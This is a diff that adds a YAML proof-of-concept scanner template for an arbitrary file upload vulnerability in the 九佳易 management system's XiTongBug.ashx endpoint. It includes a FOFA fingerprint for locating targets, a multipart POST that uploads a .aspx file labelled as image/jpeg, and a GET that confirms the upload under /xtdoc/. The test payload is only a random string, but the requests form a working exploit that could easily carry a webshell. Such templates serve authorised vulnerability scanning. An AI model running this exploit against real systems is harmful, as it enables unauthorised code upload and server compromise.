@@ -1,0 +1,33 @@
+id: poc-yaml-jiu-jia-yi-ms-xitongbug-ashx-anyfile-upload
+info:
+  name: 九佳易管理系统 XiTongBug.ashx 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 九佳易管理系统
+  fofa: body="4008-820-967"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /XiTongBug.ashx
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/jpeg
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,".aspx")
+  output:
+  - regex_match(body,"xtdoc/(?P<file>.*?).aspx")
+- method: GET
+  path: /xtdoc/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
